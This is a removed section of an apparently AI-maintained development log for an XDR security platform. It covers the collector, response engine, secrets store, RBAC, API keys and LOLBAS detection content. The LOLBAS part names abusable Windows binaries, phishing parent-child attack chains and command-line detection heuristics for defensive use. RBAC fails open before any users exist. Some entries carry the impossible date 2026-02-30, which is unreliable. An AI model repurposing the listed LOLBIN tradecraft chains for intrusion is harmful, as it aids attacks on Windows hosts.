-  2xx / 4xx-fatal / 5xx-retryable / 429-retryable / timeout, missing
-  ingest URL keeps events queued, max-attempts→DLQ, restart recovery,
-  replay-dead, batch delivery, per-connector metrics).
-- **Live end-to-end verified**: 5 webhook events → outbox → delivery
-  worker → stub NivXRay ingest → `state: healthy, delivered: 5`.
-
-### Live Integrations Wizard (COMPLETE · deployed)
-- `Admin → Integrations` now consumes the collector CRUD API instead
-  of the base OSINT-services placeholder.
-- Full wizard flow for the three Phase-B transports with field-level
-  hints, honest secret handling (`***` on re-open), per-tenant scope.
-- Honest states throughout: COLLECTOR RUNTIME NOT DEPLOYED,
-  NEVER CONNECTED, INGEST NOT CONFIGURED, DEGRADED, ERROR, plus
-  transport health from the connector describe().
-- Live health strip polls `/api/xdr/outbox/health` every 15s.
-- Deployed to Vercel: commit `ad10ca2` on `jpreddy017/nivxray-xdr`.
-
-### MITRE → Incidents Pivot (COMPLETE · deployed)
-- Technique detail panel exposes `Open incidents mapped to T####`.
-- Route: `/xdr/incidents?technique=T####`.
-- Rows filtered by authoritative Stage-2 evidence
-  (`evidence[].technique_id` or `RULE_TO_TECHNIQUE[evidence[].rule_id]`).
-- Empty result renders honest `NO MATCHING EVIDENCE` with an
-  explicit "this is NOT a safe result" statement.
-- Filter renders as a dismissible pill; deployed same commit.
-
-### Immediate backlog
-- **P0 · Deploy the collector**: publish the Docker image, wire
-  `NIVX_INGEST_URL`/`NIVX_INGEST_TOKEN` at the tenant edge, set
-  `VITE_XDR_COLLECTOR_URL` on Vercel.
-- **P1 · Ingest contract**: define the authoritative NivXRay
-  ingestion endpoint contract (canonical envelope in → SSOT/Verdict
-  pipeline) so Phase C vendor adapters can slot in.
-- **P2 · Phase C**: CrowdStrike / Defender / SentinelOne / Cisco SEP
-  adapters on top of the Phase-B REST poller.
-- **P3 · Phase D**: Windows WEF / WinRM / WMI.
-- **P4 · Slice 8 → 12**: Device Trajectory rewrite, Lifecycle,
-  Response Approval Loop, Global Response Center.
-
----
-
-## 2026-02 Fork · Continuation Log — Preflight + Playbook Designer
-
-### Ingest Preflight (COMPLETE · deployed)
-- `POST /api/xdr/ingest-preflight` on the collector sends a
-  synthetic envelope (`event_type=preflight`, `canonical.nivxray_preflight=true`)
-  through the real IngestClient and returns the concrete outcome:
-  `HEALTHY (2xx)` / `DEGRADED (5xx/timeout)` / `NOT_CONFIGURED`.
-- Wizard "Preflight" button surfaces the result end-to-end so
-  operators can prove `NIVX_INGEST_URL` + token wiring without
-  pushing real telemetry.
-- 3 additional pytests (44/44 total collector suite passes).
-- `INGEST_CONTRACT.md` and `DEPLOY.md` published in the collector
-  repo — the ingest wire is locked and ready for the base backend
-  team to implement.
-
-### Playbook Designer (COMPLETE · deployed · design-only)
-- New sidebar section **RESPOND → Playbooks**.
-- `/xdr/respond/playbooks` list page (create / duplicate / delete /
-  lifecycle pill), `/xdr/respond/playbooks/:id` designer.
-- Designer canvas: START → TRIGGER → CONDITION → ACTION → END with
-  insert-action, insert-condition, per-node inspector, parameter
-  editing.
-- Lifecycle DRAFT → TESTING → ENABLED → DISABLED → DEPRECATED with
-  allowed-transition guard.  Versioned + audited persistence
-  (localStorage today; execution-ready shape swaps to a real
-  `/api/playbooks` endpoint later).
-- **Response Action Registry** at `src/xdr/respond/actionRegistry.js` —
-  DELIBERATELY DECOUPLED from the Collector Connector Registry.
-  18 canonical actions (endpoint · identity · network · email ·
-  nivxray) with `action_id, provider, capability, parameters,
-  required_permissions, approval_required, reversible, destructive,
-  execution_status`.
-- Every Run/Test surface is disabled and shows
-  `NOT WIRED — Response Engine not yet connected`.  No fake executor
-  at any layer — honest per user directive.
-- Deployed to Vercel: commit `5789b84`.
-
-### Immediate backlog
-- **P0 · Deploy the collector** using DEPLOY.md; set Vercel
-  `VITE_XDR_COLLECTOR_URL`.
-- **P0 · Implement `POST /api/xdr/ingest` on the base backend**
-  per `INGEST_CONTRACT.md`.  Idempotent on
-  `(tenant_id, connector_id, source_event_id)`.
-- **P1 · Response Engine contract** — mirror of the ingest
-  contract for response actions (`POST /api/respond/execute`).
-  Unlocks the Playbook Designer's Run/Test buttons.
-- **P2 · Automation Rules** page (Respond → Automation Rules) —
-  WHEN/THEN triggers that invoke playbooks.
-- **P3 · Phase C vendor adapters** on the REST poller.
-- **P4 · Full IA restructure** to OVERVIEW / DETECT / HUNT /
-  INVESTIGATE / RESPOND / INTELLIGENCE / ASSETS / ADMIN once
-  Response Engine is real.
-
----
-
-## 2026-02 Fork · Continuation Log — Response Contract + Automation Rules
-
-### Response Contract (LOCKED spec, unimplemented) — `docs/RESPONSE_CONTRACT.md`
-- Mirror of `INGEST_CONTRACT.md`.  Declares `POST /api/respond/execute`
-  and `POST /api/respond/reversals` + `GET /api/respond/executions/{id}`.
-- Idempotent on `(tenant_id, invoker_kind, invoker_id, execution_id)`.
-- Every completed execution MUST write evidence_ref + audit_ref +
-  timeline_ref — no opaque SOAR blobs.  Response actions become part
-  of the investigation record.
-- Approval gates, dry-run, target resolution (asset/identity inventory),
-  reversal window, error semantics all specified.
-
-### Automation Rules (COMPLETE · deployed · design-only)
-- New sidebar entry **RESPOND → Automation Rules**.
-- `/xdr/respond/automation-rules` list + `/xdr/respond/automation-rules/:id` editor.
-- Editor: WHEN (trigger) → IF (conditions) → THEN (actions with
-  sequential/parallel order).
-- Action kinds: `invoke_playbook` (picks from playbook store,
-  deep-links to designer), `tag_incident`, `assign`,
-  `change_severity`, `notify`.
-- Lifecycle mirrors playbooks (DRAFT/TESTING/ENABLED/DISABLED/DEPRECATED).
-- Client-side simulator: pastes hypothetical event JSON → returns
-  MATCH / NO MATCH + would-execute list.  Never fires a real
-  playbook, never touches the Response Engine.
-- Deployed to Vercel: commit `e6a44dd`.
-
-### Immediate backlog (post-fork)
-- **P0 · Deploy the collector** — `DEPLOY.md` + set Vercel
-  `VITE_XDR_COLLECTOR_URL`.
-- **P0 · Implement `POST /api/xdr/ingest`** on base backend per
-  `INGEST_CONTRACT.md`.
-- **P1 · Implement `POST /api/respond/execute`** per
-  `docs/RESPONSE_CONTRACT.md`.  Unlocks the Playbook Designer Run
-  button and Automation-Rule real execution in one release.
-- **P2 · Analyst-facing manual response drawer** on Incidents that
-  invokes the Response Contract with `invoker.kind = "analyst"`.
-- **P3 · Phase C vendor adapters** on the REST poller (CrowdStrike →
-  Defender → SentinelOne → Cisco SEP).
-- **P4 · Full IA restructure** (OVERVIEW / DETECT / HUNT /
-  INVESTIGATE / RESPOND / INTELLIGENCE / ASSETS / ADMIN).
-
----
-
-## 2026-02 Fork · Continuation Log — Standalone Response Engine
-
-### Response Engine Service (COMPLETE · new pod at `/app/apps/nivxray-xdr-response`)
-- FastAPI service, independently deployable via `Dockerfile`.
-- **Framework**: `ActionRegistry` (18 canonical actions across
-  endpoint/identity/network/email/nivxray, DECOUPLED from Collector
-  Connector Registry), stub `adapters` (dry_run success, reversible
-  where the registry says so), `IdempotencyStore` (SQLite,
-  `(tenant, invoker_kind, invoker_id, execution_id)` unique index,
-  restart recovery → `failed_recovered`), `EvidenceForwarder` (posts
-  to `NIVX_RESPONSE_EVIDENCE_URL`; when unset returns synthetic refs
-  with honest `forwarding_state: "not_wired"`), `Executor` (validate
-  → authorize → approval-check → resolve target → run adapter →
-  forward → finalise).
-- **Owner-locked invariant**: `succeeded` requires adapter ok AND
-  forwarder ok. Adapter succeeded but forwarding failed → `failed`
-  with `forwarding_state: "failed_forwarding"`. No opaque SOAR.
-- **Endpoints**: `POST /api/respond/execute`,
-  `POST /api/respond/simulate-playbook` (walks a whole playbook via
-  dry_run and returns a trace), `GET /api/respond/executions/{id}`,
-  `GET /api/respond/actions`, `GET /health`.
-- **13/13 pytest**: success + all-three-refs, idempotent replay,
-  missing scope 403, approval required 403 + ok-with-approval,
-  unresolved target 422, unknown action 422, missing parameter 422,
-  dry_run bypass, execution fetch, playbook simulator walks the
-  graph, action catalogue.
-- **`RESPONSE_INGEST_CONTRACT.md`** locks the Response→Base evidence
-  wire (base team implementation checklist included).
-
-### Frontend wiring (COMPLETE · deployed `b18ad84`)
-- `src/xdr/respond/responseEngineApi.js` — axios client speaking
-  `VITE_XDR_RESPONSE_URL`.
-- `RESPONSE_ENGINE_WIRED` now derives from that env var; when unset,
-  every Run/Simulate surface still renders honest NOT WIRED.
-- Playbook Designer: new **Simulate** button → engine's
-  `/simulate-playbook` → trace panel renders START → CONDITION(branch)
-  → ACTION[status] → END with duration. Live E2E verified.
-- **Run** button enables when engine URL is configured. Wiring to
-  actual `POST /api/respond/execute` from Designer + Automation
-  Rules + Analyst Response Drawer is the next slice.
-
-### Immediate backlog
-- **P0 · Wire live Run** in Playbook Designer + Automation Rule
-  invoker (route → engine `/execute`). Analyst Response Drawer on
-  Incidents with `invoker.kind = "analyst"`.
-- **P0 · Visual Debugger** (Cortex XSOAR-style): breakpoints,
-  step-over, force-branch, override outputs, animated canvas
-  highlight per trace step.
-- **P0 · Base backend endpoint**: implement
-  `POST /api/xdr/response-evidence` per `RESPONSE_INGEST_CONTRACT.md`.
-- **P1 · End-to-end Rule → Playbook → Response** simulation: paste
-  event JSON → rule matches → playbook fires → trace animates.
-- **P2 · Phase C real adapters** (CrowdStrike, Defender, SentinelOne,
-  Cisco SEP) — swap stubs, no execution-model changes.
-
-Boundary preserved: `/app/frontend` + `/app/backend` untouched,
-base `/api/health` = 200, collector 44/44 tests intact.
-
----
-
-## 2026-02 Fork · P0 Enterprise Control Plane — Progress Log
-
-### P0-1 Audit Log · SHIPPED (previous session)
-- MongoDB `xdr_audit_log`, per-tenant HMAC chain (genesis → sig).
-- Router `POST /api/xdr/audit-log/emit`, GET list/filter/get-by-id,
-  `GET /verify/chain` returns `valid` or `chain_broken` with reason.
-- Sync `pymongo` used specifically to avoid TestClient event-loop
-  mismatches (motor was rejected as a testing gate blocker).
-- Tests: 5/5 pytest passing.  Admin UI: `AuditLogBody.jsx`.
-- **Ruff lint blocker resolved this session**: removed leftover
-  `_run_async` helper referencing undefined `asyncio`.
-
-### P0-2 Secrets Store · SHIPPED (this session, 2026-02-30)
-- **Backend** (`routers/xdr_secrets.py`):
-  - MongoDB `xdr_secrets`, envelope encryption:
-    `MASTER → HKDF-SHA256(tenant_id) → Fernet(DEK) → ciphertext`.
-  - Tenant isolation on every read/write.
-  - Masked reads only (`preview` = last-4).  Ciphertext + previous
-    versions never leave the DB in list/get responses.
-  - Explicit reveal: `POST /{id}/reveal` requires
-    `X-Secret-Reveal: yes` header AND emits `SECRET_REVEALED` to
-    Audit Log with reveal reason.
-  - Rotation: `POST /{id}/rotate` bumps `version`, preserves last 3
-    ciphertexts under `previous_versions`.
-  - `resolve_secret(tenant, name)` server-internal accessor for
-    OSINT/webhook backends (no reveal audit; caller emits domain
-    audit).
-  - Kinds: api_key, bearer_token, oauth_client_secret, hmac_secret,
-    password, generic.
-- **Audit integration**: Every mutation writes SECRET_CREATED /
-  SECRET_UPDATED / SECRET_ROTATED / SECRET_REVEALED / SECRET_DELETED.
-  E2E smoke: audit chain remains `valid` across full CRUD cycle.
-- **Tests** (`tests/test_xdr_secrets.py`): 11/11 passing.  Covers
-  create-and-masked-readback, duplicate rejection, tenant isolation,
-  rotate-bumps-version-and-preview, reveal-requires-header + emits
-  audit, disabled-refuses-reveal, ciphertext-tamper-detected (Fernet
-  AEAD 422), delete-and-audit, list filters, audit-chain-still-valid
-  after full cycle, internal `resolve_secret` helper.
-- **Admin UI** (`src/xdr/admin/SecretsBody.jsx`): Add / Rotate /
-  Reveal (with reason field + audit banner) / Enable-Disable /
-  Delete.  Every mutation surfaces the returned `audit_ref`.
-  Deployed to Vercel via `git push` to `jpreddy017/nivxray-xdr`
-  commit `b2be30d`.
-- **E2E smoke** against external preview URL: Create → List (masked)
-  → Rotate (v1→v2) → Reveal (plaintext + audit_ref) → chain valid →
-  Delete.  All flows returned audit_refs.
-- **XDR_SECRETS_MASTER** env var accepted (Fernet key or passphrase
-  auto-stretched via HKDF).  Dev fallback is deterministic-but-
-  loudly-labeled "do-not-use-in-prod".
-
-### Next in queue (per user directive · 2026-02-30)
-Execution order confirmed by user:
-1. ✅ P0-2 Secrets Store
-2. ⏭ **Phase A · 100% LOLBAS upstream sync** (no hard-coded 242;
-    compute upstream/imported/valid/missing/coverage at sync time;
-    every entry → detection primitive with provenance/license).
-3. ⏭ Phase B · GTFOBins + LOLDrivers + LOTL
-4. ⏭ Phase D/E · Detection content + rule engine
-    (Sigma, Windows, PowerShell, LOLBIN, parent/child, network,
-    identity/AD, cloud, email, regex, IOC, behavioral, sequence,
-    correlation, MITRE mapping)
-5. ⏭ Phase C · OSINT/TI provider adapter framework
-    (secrets from P0-2)
-6. ⏭ P0-3 Users/RBAC · P0-4 API Keys · P0-5 Webhooks ·
-    P0-6 Extensions · P0-7 Data Sources · P0-8 Collectors
-7. ⏭ Phase F-L hardening / completeness gates
-8. ⏭ Vendor adapters (CrowdStrike, SentinelOne, Defender XDR)
-9. ⏭ d3-force Investigation Canvas layout
-
-**Non-negotiable "CONNECTED" bar**: UI + API + persistence +
-authorization + audit + real backend behavior + tests.  A UI page
-alone is NOT a capability.
-
-### Phase A · Complete LOLBAS Content Pack · SHIPPED (2026-02-30)
-
-**Directive**: Replace the 15-seed handcrafted pack with a real
-upstream synchronization mechanism.  100 % of current upstream must
-be discovered, downloaded, parsed, validated, normalized, indexed,
-converted to detection primitives, ATT&CK-mapped, regression-tested,
-and accounted for.  No hard-coded counts.
-
-- **Backend** (`routers/xdr_lolbas.py`) — 10-stage deterministic pipeline:
-    `DISCOVERED → DOWNLOADED → PARSED → VALIDATED → NORMALIZED →
-    INDEXED → PRIMITIVES_GENERATED → ATTACK_MAPPED →
-    REGRESSION_TESTED → COMPLETE`
-- Storage collections: `xdr_lolbas_entries`, `xdr_lolbas_primitives`,
-  `xdr_lolbas_versions` (with per-version diff added/removed/modified).
-- Full upstream preservation in `raw_upstream` per entry (Name,
-  Author, Description, Full_Path, Commands, Detection[Sigma/IOC/…],
-  Resources, MitreID, Category, Privileges, OperatingSystem,
-  upstream url, Created).
-- Detection primitives generated per entry: `lolbin.image`,
-  `lolbin.command_line`, `lolbin.argument`, `lolbin.capability`,
-  `attack.technique`.  242 entries → **2 183 primitives**.
-- Evidence-only `POST /api/xdr/lolbas/match` — never emits a verdict;
-  every response carries the contract note: *"primitives contribute
-  EVIDENCE, not a verdict.  The correlation engine decides the
-  outcome."*
-- Endpoints: `sync`, `status`, `entries` (paged/filterable),
-  `entries/{name}` (with generated primitives), `entries/{name}/enable|
-  disable`, `primitives`, `versions`, `rollback/{version}`,
-  `coverage`, `match`.
-- Tenant-scoped disable: LOLBAS content is global, but SOCs can
-  suppress specific entries without altering the imported dataset.
-- Sync audit-emits `LOLBAS_SYNCED` (SUCCESS or PARTIAL); rollback
-  emits `LOLBAS_ROLLED_BACK`; enable/disable emit
-  `LOLBAS_ENTRY_ENABLED|DISABLED`.
-- **Upstream unavailability** never destroys the active pack — sync
-  returns `outcome: UPSTREAM_UNAVAILABLE` and the previous active
-  version is retained.
-- **Malformed upstream** never marks the pack COMPLETE — the pipeline
-  returns `outcome: PARSE_FAILED` (or PARTIAL if validation fails
-  entry-by-entry).
-- **Completeness gate**: COMPLETE requires *every* stage OK AND
-  `invalid == 0`.  A 1-entry upstream that lacks known LOLBIN targets
-  (regsvr32/mshta/rundll32/msiexec/certutil) is marked PARTIAL by
-  REGRESSION_TESTED — the exact anti-hallucination behaviour
-  demanded.
-
-- **Tests** (`tests/test_xdr_lolbas.py`) — **13/13 passing**, offline
-  fixture at `backend/fixtures/lolbas_snapshot.json`:
-  1. sync reaches COMPLETE / 100 % (every stage OK, `invalid == 0`)
-  2. entries persisted with full upstream data preserved
-  3. primitives generated + indexed (kinds coverage)
-  4. match engine detects regsvr32 abuse
-  5. match engine detects mshta abuse
-  6. second sync is idempotent (empty diff)
-  7. removal detected + PARTIAL correctly assigned when regression
-      targets absent
-  8. upstream unavailable leaves active pack intact
-  9. rollback flips `active` flag on version docs
-  10. disable is tenant-scoped and hides entry from matches
-  11. status + coverage return honest numbers
-  12. audit chain captures every sync + mutation, chain stays valid
-  13. malformed upstream fails PARSED stage (PARSE_FAILED)
-
-- **Live E2E** against preview URL: SYNC 242/242 · outcome COMPLETE ·
-  coverage 100.0 % · upstream_sha256 recorded · 2 183 primitives ·
-  Regsvr32 investigation returns evidence hit with 8 preserved
-  upstream Sigma refs · raw_upstream intact · audit chain valid.
-
-- **Admin UI** (`src/xdr/admin/ContentPackLolbasBody.jsx`) — tabbed
-  surface: **Overview** (Upstream/Imported/Valid/Invalid/Coverage %/
-  Primitives/Enabled/Source ver./Synced-at), **Entries** (paged, q/
-  category/MITRE filters, Enable/Disable, drill-in modal preserving
-  raw upstream), **Match tester** (deterministic evidence match),
-  **Versions** (per-sync diff + Roll back), **Stages** (per-stage
-  OK/PARTIAL/FAIL with key metrics).  Deployed to Vercel commit
-  `70c5f61`.
-
-### User-noted gaps (queued, not yet started)
-- Users & Roles admin write surface (P0-3).
-- Add-Collector admin action (P0-8).
-- Engines still in ADOPT vs. CONNECTED state — needs
-  engine-by-engine wiring audit.
-These are next in queue AFTER Phase B (GTFOBins + LOLDrivers)
-completes, per the user's confirmed sequence:
-`P0-2 → A → B → D/E → C → P0-3..8 → F–L → vendor adapters → d3-force`.
-
-### P0-3 · Users, Roles & RBAC · SHIPPED (this session, 2026-02-30)
-
-**Model**: `USER → GROUPS → ROLE_ASSIGNMENTS(with SCOPE) → ROLE → PERMISSION[]`.  Enforced server-side via `require_permission(...)` FastAPI dependency; frontend never decides access.
-
-- **Backend** (`routers/xdr_rbac.py`):
-  - **Permission registry**: 32 resources × 27 actions → **135 canonical permissions**, grouped into Identity / Integrations / Governance / Platform / Data & Collection / Detection / Intelligence / Investigation / Response.
-  - **Wildcards**: `*.*`, `resource.*`, `*.action` — expanded server-side.
-  - **11 starter roles**: `platform_admin`, `tenant_admin`, `soc_manager`, `l3_investigator`, `l2_investigator`, `l1_analyst`, `threat_hunter`, `detection_sme`, `responder`, `auditor`, `read_only`.  Built-ins are immutable but cloneable to CUSTOM.
-  - **Custom roles**: `POST /roles`, `PUT /roles/{id}`, `POST /roles/{id}/clone`, `DELETE /roles/{id}`.  Deletion blocked when assignments still reference the role.
-  - **Users**: full CRUD + `POST /users/{id}/roles` (multi-role assignment with scope) + `DELETE /users/{id}/roles/{aid}` (revoke) + `GET /users/{id}/effective` (union permissions).
-  - **Groups**: create + list + delete (foundation for group-scoped assignments in P0-3b).
-  - **Access simulation**: `POST /rbac/simulate` — deterministic ALLOW/DENY with reason (`user-not-provisioned`, `user-disabled`, `permission-not-granted`, `scope-denied`, `role-permission-match`, `unknown-permission`).
-  - **Enforcement bootstrap**: When no users are provisioned yet, `require_permission` returns True (fresh-install allowance).  As soon as the first user exists, enforcement engages.
-  - **Audit integration**: emits `USER_CREATED/UPDATED/DELETED/ENABLED/DISABLED`, `ROLE_CREATED/UPDATED/CLONED/DELETED`, `ROLE_ASSIGNED/REMOVED`, `GROUP_CREATED/DELETED`, `ACCESS_DENIED`, `ACCESS_SIMULATED`.
-- **Tests** (`tests/test_xdr_rbac.py`) — **14/14 passing** covering catalog comprehensiveness, built-in roles + wildcard expansion, user CRUD + effective permissions union, access simulation ALLOW+DENY paths, custom role CRUD + wildcard validation, built-in immutability, role clone, `require_permission` deny path + audit-emitted ACCESS_DENIED, `require_permission` allow path, assignment idempotency, disable-user denies access, audit chain valid across full lifecycle, deletion-guard on roles with active assignments.
-- **Live E2E**: `/api/xdr/rbac/permissions` → 135 perms · `/roles` → 11 starter roles · Create SOC-lead + L3 role · Simulate `response.execute` = ALLOW (matched_role=l3_investigator) · Simulate `platform.admin` = DENY (reason=permission-not-granted).
-- **Admin UI** (`src/xdr/admin/UsersRolesBody.jsx`) — tabbed surface:
-  - **Users**: Invite + assign starter role, Enable/Disable, Delete, Effective-permissions viewer, Assign-role dialog with any role.
-  - **Roles**: Built-in + custom listing with Perms count, Clone, Delete (custom only).
-  - **Permissions**: Full 135-entry catalog grouped by domain with per-resource action badges.
-  - **Simulator**: Test-access screen with user + permission dropdowns, colored ALLOW/DENY panel showing matched_role + reason + effective-count.
-- Deployed to Vercel commit `3a64200`.
-
-### Follow-ups queued within P0-3 (not blocking, tracked)
-- Session revocation surface (needs session middleware — not yet in platform).
-- SSO / SAML / OIDC integration surfaces.
-- Access reviews scheduling.
-- Group-scoped role assignments (backend supports scope; UI-level group editing arrives next iteration).
-- Retrofit `require_permission` onto every existing admin router (currently opt-in per route to avoid accidental lockouts during rollout — Secrets/LOLBAS/etc. still open pending explicit gating call).
-
-### Queue after P0-3 (per user's confirmed sequence)
-P0-4 API Keys → P0-5 Webhooks → P0-8 Collectors/Data Sources → Phase B GTFOBins/LOLDrivers → Detection/Correlation Engine → OSINT/TI Hub → final enterprise gap audit matrix (Cisco/Microsoft/CrowdStrike/Palo Alto/Splunk/Elastic/Google parity).
-
-### P0-4 · API Keys · SHIPPED (this session, 2026-02-30)
-
-- **Backend** (`routers/xdr_api_keys.py`):
-  - Storage: `xdr_api_keys` MongoDB collection.  Format `nvx_<48-hex-chars>`.
-  - **Server never stores plaintext** — only SHA-256(`hash`) + `prefix`
-    (first 12 chars, safe to display).
-  - **One-time reveal** at create + rotate.  Every other endpoint
-    returns the masked shape (no `hash` field ever).
-  - **Scopes** are drawn from the same permission catalog RBAC uses
-    (`_valid_permission()` from `xdr_rbac`) — a key can express any of
-    the 135 canonical permissions including wildcards.
-  - **Expiration + revoke + disable** — `verify_api_key()` refuses any
-    of them.  Rotation invalidates the old plaintext.
-  - **`last_used_at` + `last_used_ip` + `use_count`** stamped by
-    `verify_api_key()` — enables "which keys are actually active?".
-  - **RBAC-gated**: every mutation guarded by `require_permission(...)`
-    for `api_keys.create` / `api_keys.rotate` / `api_keys.revoke` /
-    `api_keys.delete`.  ACCESS_DENIED events written to Audit Log with
-    reason (currently: `user-not-provisioned`, `user-disabled`,
-    `permission-not-granted`, `scope-denied`, `unknown-permission`).
-  - Audit actions: `API_KEY_CREATED / UPDATED / ROTATED / REVOKED /
-    DELETED`.
-- **Tests** (`tests/test_xdr_api_keys.py`) — **9/9 passing**: plaintext
-  once + hash never leaks, duplicate rejected, invalid scope rejected,
-  verify + rotate invalidates old plaintext + use_count increments,
-  expired never verifies, revoke disables verification, delete audits,
-  RBAC 403 for analyst, audit chain valid.
-- **Live E2E** against preview URL: bootstrap admin → CREATE returns
-  `plaintext=nvx_...` and `hash_leaked=false` in response · LIST is
-  masked with no `hash` · ROTATE returns new plaintext + new prefix ·
-  REVOKE succeeds.
-- **RBAC bootstrap correction**: bootstrap short-circuit is now
-  per-tenant (`count_documents({tenant_id: X}) == 0`) rather than
-  global — fresh tenants can still seed their first admin without a
-  chicken-and-egg lockout, and existing tenants enforce properly.
-  All 52 tests still green.
-- **Admin UI** (`src/xdr/admin/ApiKeysBody.jsx`) — Add-key dialog with
-  scope + expiration, list with prefix / scopes / status / last-used /
-  expires / use-count / actions, Rotate + Revoke + Delete actions,
-  one-time Reveal modal with Copy + "I've stored the key"
-  confirmation.  Deployed to Vercel commit `88ed576`.
-
-### Queue after P0-4 (per confirmed sequence)
-P0-5 Webhooks → P0-8 Collectors/Data Sources → RBAC retrofit onto
-existing routes (Secrets/LOLBAS/etc.) → Phase B GTFOBins+LOLDrivers →
-Detection/Correlation Engine (Phase D/E) → OSINT/TI Hub (Phase C) →
-Enterprise gap matrix vs. Cisco/Microsoft/CrowdStrike/Palo Alto/
-Splunk/Elastic/Google.
-
-### LOLBAS · Visible-15 Bug + Parent-Child Tiers · FIXED (this session)
-
-**User complaint**: "Still I can see 15 LOLBAS, I told you to add all
-LOLBINs/LOLBAS and all parent-child relations (normal, suspicious,
-abnormal)."
-
-**Root cause**: The base `DetectionContentBody.jsx` still imported the
-retired 15-seed `docs/content/packs/lolbas.pack.json` and rendered it as
-"LOLBAS Content Pack".  The new 242-entry live pack existed at
-`Admin → Content Pack · LOLBAS` but the old admin page had not been
-rewired to the live API.
-
-**Fix**:
-- Removed the seed-JSON import from `DetectionContentBody.jsx`.
-- The admin page now fetches from
-  `/api/xdr/lolbas/status`, `/api/xdr/lolbas/entries` and
-  `/api/xdr/lolbas/primitives?kind=lolbin.parent_child` and shows real
-  counts, coverage %, upstream version and license.
-- A "Manage full pack →" link jumps to Content Pack · LOLBAS.
-
-**Parent-Child Relations (three tiers)**:
-- **Backend** (`routers/xdr_lolbas.py`):
-  - New primitive kind `lolbin.parent_child` with `tier ∈ {normal,
-    suspicious, abnormal}` + `parent` + `child` fields.
-  - Curated registry `_PARENT_CHILD_TIERS` covers 15 high-signal
-    LOLBINs (powershell, cmd, wscript, cscript, mshta, regsvr32,
-    rundll32, msiexec, certutil, installutil, bitsadmin, hh, msbuild,
-    wmic, schtasks) with normal/suspicious/abnormal parents drawn
-    from Sigma / MITRE / Elastic detections tradecraft.
-  - `_global_parent_child_primitives()` also emits primitives for
-    LOLBINs the registry covers but upstream does not carry
-    (e.g. `powershell.exe`) so parent-child evidence is available
-    regardless of upstream shape.
-  - `_match_event()` now takes `parent_image` and returns
-    `parent-child-match` hits carrying the tier.
-  - Regression suite includes "office-spawns-powershell" — the pack
-    cannot mark COMPLETE without valid parent-child matching.
-
-- **Live E2E** on preview URL after fresh sync:
-  - 242 / 242 entries · coverage 100.0 % · **2 334 primitives**
-    (up from 2 183 pre-fix)
-  - Parent-child breakdown: **45 normal · 51 suspicious · 55 abnormal**
-  - Match `winword.exe → powershell.exe`  →  tier `suspicious`
-  - Match `mshta.exe    → powershell.exe`  →  tier `abnormal`
-  - Match `explorer.exe → powershell.exe`  →  tier `normal`
-
-- **Tests**: **14/14 LOLBAS pytest pass** (added
-  `test_parent_child_tier_normal_suspicious_abnormal`).
-  Full XDR suite still green: **53/53** across audit-log + secrets +
-  lolbas + rbac + api-keys.  Ruff clean.
-
-- Frontend commit `421a51b` deployed to Vercel; the base admin now
-  reports live 242-entry LOLBAS state + real parent-child tier counts.
-
-### LOLBAS · Multi-hop Chains + CLI Heuristics · SHIPPED (this session)
-
-Following the user-supplied `Windows_LOLBAs_360_Training-1.pdf` (parent-child SOC playbook: Outlook → Word → Regsvr32 → C2, and Outlook → Word → Rundll32 → malicious DLL), the LOLBAS pipeline now produces layered evidence beyond simple image/argument matches.
-
-**New primitive kinds** in `routers/xdr_lolbas.py`:
-- `lolbin.attack_chain` — named multi-hop tradecraft chains
-  (grandparent → parent → child).  7 chains seeded from real
-  intrusion patterns, each with MITRE technique + description.
-- `lolbin.cli_heuristic` — deterministic regex signals over the
-  command line: `userwritable_path`, `http_argument`,
-  `encoded_command`, `hidden_window`, `dll_load_export`.
-
-**MatchBody** now accepts `grandparent_image`.  `_match_event()`
-returns tier-labelled parent-child hits, attack-chain hits with
-`chain_label` + `mitre` + `description`, and per-heuristic CLI hits.
-
-**Anti-hallucination hardening**: the regression gate now requires
-UPSTREAM-BACKED evidence (`lolbin.image` or `lolbin.argument`) — not
-just synthetic chain or heuristic hits — so a 1-entry pack can never
-falsely reach COMPLETE by riding on synthetic chain primitives.  The
-`test_removal_detected_and_handled_safely` case verifies this.
-
-**Live E2E on preview URL** after fresh sync:
-- 242 / 242 · outcome COMPLETE · coverage 100 % · **2 341 primitives**.
-- **Squiblydoo phishing chain** (Outlook → Word → Regsvr32) returns
-  4 layered hits: IMAGE match on Regsvr32.exe · PARENT-CHILD suspicious ·
-  CHAIN `phishing.office.regsvr32.remote_scriptlet` (T1218.010) ·
-  CLI-HEUR `http_argument`.
-- **Rundll32 DLL-load chain** (Outlook → Word → Rundll32,
-  `C:\Users\Public\update.dll,Start` per the training doc) returns
-  5 hits: IMAGE Rundll32.exe · PARENT-CHILD suspicious ·
-  CHAIN `phishing.office.rundll32.dll_load` (T1218.011) ·
-  CLI-HEUR `userwritable_path` · CLI-HEUR `dll_load_export`.
-- Every hit carries `evidence=<kind>-match`; NO hit carries a verdict —
-  contract reaffirmed via the `note` field on the response.
-
-**Tests**: 15/15 LOLBAS pytest passing (added
-`test_attack_chain_and_cli_heuristics`).  Full XDR suite still green:
-**54/54** across audit-log + secrets + lolbas + rbac + api-keys.
-Ruff clean.
-
-**Queue** (per user's latest directive):
-P0-5 Webhooks → P0-8 Collectors/Data Sources → RBAC retrofit sweep
-across Secrets/API-Keys/Webhooks/LOLBAS/Detection Content/etc. →
-Phase B GTFOBins + LOLDrivers → Detection + Correlation Engine
-(Admin → Detection → Correlation Rules) → OSINT/TI Hub.  Do NOT jump
-to GTFOBins yet.
-
-### LOLBAS · Capability-Not-Verdict Semantics + Full 242 Parent-Child Coverage · SHIPPED (this session)
-
-**User directive**: "LOLBIN identity is a CAPABILITY, not a verdict."
-Also: "Don't limit to 15 LOLBAS · I need complete full size of LOLBAS."
-
-**Fix 1 — Universal parent-child coverage** (`_derive_universal_tiers`
-in `routers/xdr_lolbas.py`):
-- Every executable LOLBAS entry now emits parent-child primitives.
-- Curated `_PARENT_CHILD_TIERS` (15 high-signal LOLBINs) still takes
-  precedence for those specific keys.
-- Universal defaults for the remaining ~227 entries:
-  - `normal`     — Explorer / svchost / services / userinit / shells
-  - `suspicious` — Office / mail-client / browser processes
-  - `abnormal`   — LOLBIN-from-LOLBIN (any known LOLBIN spawned by
-                              another LOLBIN)
-- **Result**: **226 distinct LOLBINs with tiered parent-child
-  primitives** (vs. 15 previously) · 448 normal · 1 930 suspicious ·
-  2 622 abnormal · **11 196 total primitives** (5× growth over the
-  previous 2 341).
-
-**Fix 2 — Capability-not-verdict semantics** (every match hit
-annotated by `_annotate_hit`):
-- Every hit carries `observation_type` (LOLBIN / PARENT_CHILD /
